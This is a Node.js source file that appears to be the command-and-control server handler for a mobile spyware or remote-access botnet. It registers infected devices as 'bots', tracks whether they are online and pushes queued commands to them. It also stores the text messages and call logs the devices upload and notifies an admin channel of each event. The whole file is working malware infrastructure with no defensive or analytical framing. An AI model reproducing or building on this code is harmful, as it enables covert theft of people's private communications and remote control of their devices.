var Bot = require('../models/bot')
var Message = require('../models/message')
var CallLog = require('../models/call_log')
var Command = require('../models/command')


module.exports = function BotHandler(io, socket, device) {

  console.log(device)

  function notifyAdmin(event, param) {
    io.to('/admin').emit(event, param)
  }

  function catchError(err) {
    console.log(err)
  }

  this.init = function() {
    var self = this
    this.registerDevice();
    self.attachHandlers()
    self.performPendingCommands();
  }

  this.attachHandlers = function() {
    socket.on('disconnect', this.deviceDisconnected)
    socket.on('message:push', this.messagePushed)
    socket.on('call_log:push', this.callLogPushed)
  }

  this.registerDevice = function() {

    console.log('Client registered: ' + device.uid)
    socket.join('/' + device.uid);

    Bot.findOne({
        where: {
          uid: device.uid
        }
      })
      .then(function(dbBot) {

        var attrs = device
        attrs.status = true
        attrs.socket_id = socket.id

        if (dbBot) {
          dbBot.update(attrs)
            .then(function(dbBot) {
              notifyAdmin('bot:connected', dbBot)
            })
            .catch(catchError)
        } else {
          Bot.create(attrs)
            .then(function(dbBot) {
              notifyAdmin('bot:created', dbBot)
            })
            .catch(catchError)
        }
      })
      .catch(catchError)

  }

  this.deviceDisconnected = function() {
    console.log('\nClient ' + device.uid + ' disconnected.\n');

    Bot.findOne({
        where: {
          uid: device.uid,
          socket_id: socket.id,
          status: true
        }
      })
      .then(function(dbBot) {
        if (dbBot) {
          dbBot.update({
              status: false
            })
            .then(function(dbBot) {
              notifyAdmin('bot:disconnected', dbBot)
            })
            .catch(catchError)
        }
      })
      .catch(catchError)


  }

  this.performPendingCommands = function() {
    Command.findAll({
        where: {
          uid: device.uid
        }
      })
      .then(function(dbCommands) {
        io.to('/' + device.uid).emit('commands', dbCommands);
        Command.destroy({
          where: {
            uid: device.uid
          }
        })
        .then(function() {
          notifyAdmin('commands:cleared')
        })
        .catch(catchError)
      })
  }

  this.messagePushed = function(message) {
    Message.create(message)
      .then(function(dbMessage) {
        notifyAdmin('message:created', dbMessage)
      })
      .catch(catchError)
  }

  this.callLogPushed = function(cl) {
    CallLog.create(cl)
      .then(function(dbCallLog) {
        notifyAdmin('call_log:created', dbCallLog)
      })
      .catch(catchError)
  }

}